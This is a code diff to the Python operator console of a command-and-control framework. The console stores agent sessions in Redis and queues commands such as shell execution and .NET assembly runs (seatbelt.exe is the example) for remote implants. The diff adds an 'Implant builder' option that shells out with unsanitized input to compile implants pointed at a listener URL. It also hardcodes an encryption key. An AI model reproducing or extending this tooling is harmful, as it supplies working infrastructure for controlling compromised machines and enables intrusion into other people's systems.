@@ -20,9 +20,18 @@ import os
 conn = redis.StrictRedis(host='localhost', port=6379, db=0)
 key = b'12345678901234567890123456789012'  # A 256 bit (32 byte) key
 
+
+def builder(platform, arch, name, listener):
+    if subprocess.Popen(f"./builder {platform} {arch} {name} {listener}", shell=True, stdout=subprocess.PIPE,
+                     cwd=r'../Builder'):
+        print("Finished")
+
+
+
 def clearDB():
     for key in conn.scan_iter("*"):
         conn.delete(key)
+
 
 def decrypt_message(key, ciphertext, nonce):
     backend1 = default_backend()
@@ -50,6 +59,7 @@ def decrypt_message(key, ciphertext, nonce):
     plaintext = decryptor.update(ciphertext) + decryptor.finalize()
 
     return plaintext
+
 
 def encrypt_message(key, plaintext):
     backend1 = default_backend()
@@ -103,6 +113,7 @@ while True:
     # We will set the retrieved value when it fetches a new command
     # If retrieved is 0, then don't display. If it's 1, display the result and then reset to 0
     inp = input('> ')
+    inp = inp.lower()
     if inp == '1':
         print('Commands possible: \n'
               'pwd      - get the current working directory \n'
@@ -110,9 +121,10 @@ while True:
               'rc       - run a single command \n'
               'rd       - read a directory \n'
               'terminal - Enter a terminal command \n'
-              'dotnet   - Expects the path to the dotnet exe; Example dotnet /home/kali/seatbelt.exe \n')
+              'dotnet   - Expects the path to the dotnet exe; Example dotnet /home/kali/seatbelt.exe \n'
+              )
         uuid = input('UUID: ')
-        #while inp != "exit":  # If the input is exit, break the loop
+        # while inp != "exit":  # If the input is exit, break the loop
         choice = input('Command: ')
         choice = choice.lower()
         splits = choice.split()
@@ -125,7 +137,8 @@ while True:
                 cm = "dotnet-exe "
                 in_file = base64.b64encode(bytes(in_file, 'utf-8'))
                 cm.append(in_file)
-        else: cm = choice
+        else:
+            cm = choice
         # I want to preserve the current last check in time
         # so dump the DB and grab that field
         dt = conn.hget('UUID', uuid)  # Get the struct
@@ -135,7 +148,7 @@ while True:
         connector = json.loads(structure)  # Load it into a new var
         LastInteraction = connector["LastInteraction"]
         whoami = connector["WhoAmI"]
-        nonce =  connector["Nonce"]
+        nonce = connector["Nonce"]
         result = connector["Result"]
         byte_inp = bytes(cm, 'utf-8')
 
@@ -163,16 +176,16 @@ while True:
         print(signature_decoded)
 
         b = base64.b64encode(signature)
-        #chacha = ChaCha20Poly1305(key)
-        #nonce = os.urandom(12)
-        #print(nonce)
-        #byte_cm = bytes(cm, 'utf-8')
-        #cm = chacha.encrypt(nonce, byte_cm, nonce)
-        #cm, nonce = encrypt_message(key, cm) # Encrypt the message
+        # chacha = ChaCha20Poly1305(key)
+        # nonce = os.urandom(12)
+        # print(nonce)
+        # byte_cm = bytes(cm, 'utf-8')
+        # cm = chacha.encrypt(nonce, byte_cm, nonce)
+        # cm, nonce = encrypt_message(key, cm) # Encrypt the message
         # encode the nonce to string before saving it
-        #decoded_nonce = base64.b64encode(nonce).decode('utf-8')
-        #chacha.decrypt(nonce, cm, nonce)
-        #print(decoded_nonce)
+        # decoded_nonce = base64.b64encode(nonce).decode('utf-8')
+        # chacha.decrypt(nonce, cm, nonce)
+        # print(decoded_nonce)
         structure = {
             "WhoAmI": f"{whoami}",
             "Nonce": f"{0}",
@@ -201,8 +214,8 @@ while True:
             connector = json.loads(structure)  # Load it into a new var
             canWeDisplay = connector["GotIt"]
         result = connector["Result"]
-        #print(result)
-        #result = base64.decode(result)
+        # print(result)
+        # result = base64.decode(result)
         result = bytes(result, 'utf-8')
         print(result)
 
@@ -216,10 +229,18 @@ while True:
     elif inp == "5":
         # print(conn.keys()) # UUID is the key, but we want values from the key
         print(conn.hgetall('UUID'))  # We're searching by hash values here
+    elif inp == '6':
+        txt = input("Expects platform arch name listener \n"
+                       "windows amd64 first http://test.culbertreport:8000 \n"
+                       "BUILDER > ")
+        splits = txt.split(" ")
+        builder(splits[0], splits[1], splits[2], splits[3])
+
     else:
         print('\n '
               '(1)Enter session \n '
               '(2)Search by UUID \n '
               '(3)Clear DB \n '
               '(4)Start a listener \n '
-              '(5)List all \n')
+              '(5)List all \n'
+              '(6)Implant builder \n')
